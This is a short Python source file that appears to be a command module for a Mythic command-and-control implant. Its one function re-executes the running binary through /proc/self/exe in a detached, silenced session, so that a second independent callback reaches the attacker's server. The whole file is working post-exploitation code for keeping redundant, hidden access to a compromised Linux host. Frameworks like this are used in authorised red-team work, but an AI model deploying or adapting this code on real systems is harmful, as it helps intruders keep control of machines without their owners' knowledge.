import subprocess

# Spawns a new instance of the agent as a separate process by re-executing the current binary.
# The new process will perform its own checkin with Mythic, generating a second independent callback.
def execute(params, task_id, callback_id):
    try:
        proc = subprocess.Popen(
            ["/proc/self/exe"],       # re-execute the current binary via the Linux /proc symlink
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            close_fds=True,
            start_new_session=True    # detach from parent session so child survives parent exit
        )
        return f"Spawned new agent with PID {proc.pid}"
    except Exception as e:
        return f"[-] {e}"
